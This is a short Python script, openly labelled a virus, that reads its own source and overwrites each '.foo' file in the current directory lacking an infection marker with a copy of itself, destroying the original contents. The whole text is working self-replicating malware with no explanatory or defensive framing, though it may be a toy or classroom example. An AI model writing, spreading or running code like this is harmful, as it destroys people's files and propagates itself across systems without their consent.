import os
INFECTION_MARKER = "231034038"

def get_script_content():
    with open(__file__, 'r') as f:
        return f.read()

def is_infected(file_path):
    try:
        with open(file_path, 'r') as f:
            content = f.read()
            return INFECTION_MARKER in content
    except Exception as e:
        print(f"Error reading {file_path}: {e}")
        return False

def infect_file(file_path, payload):
    try:
        with open(file_path, 'w') as f:
            f.write(payload)
    except Exception as e:
        print(f"Error infecting {file_path}: {e}")

def run_virus():
    script_content = get_script_content()
    
    for filename in os.listdir('.'):
        if filename.endswith('.foo') and not is_infected(filename):
            print(f"Infecting: {filename}")
            infect_file(filename, script_content)

if __name__ == "__main__":
    run_virus()
